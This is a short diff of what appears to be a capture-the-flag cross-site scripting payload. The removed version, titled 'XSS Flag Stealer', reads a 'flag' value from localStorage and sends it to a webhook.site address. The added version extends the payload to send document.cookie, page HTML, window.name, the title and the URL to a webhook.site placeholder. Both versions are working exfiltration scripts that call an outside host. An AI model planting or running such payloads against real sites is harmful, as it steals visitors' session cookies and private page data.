@@ -1,10 +1,16 @@
-<!DOCTYPE html>
-<html>
-  <head><title>XSS Flag Stealer</title></head>
-  <body>
-    <script>
-      const flag = localStorage.getItem("flag");
-      fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?flag=" + encodeURIComponent(flag));
-    </script>
-  </body>
-</html>
+<script>
+function send(data) {
+  fetch("https://webhook.site/YOUR-ID-HERE/?data=" + encodeURIComponent(data));
+}
+
+try {
+  send("flag=" + localStorage.getItem("flag"));
+  send("cookie=" + document.cookie);
+  send("html=" + document.documentElement.innerHTML.slice(0, 500));
+  send("window.name=" + window.name);
+  send("title=" + document.title);
+  send("url=" + window.location.href);
+} catch(e) {
+  send("error=" + e.message);
+}
+</script>
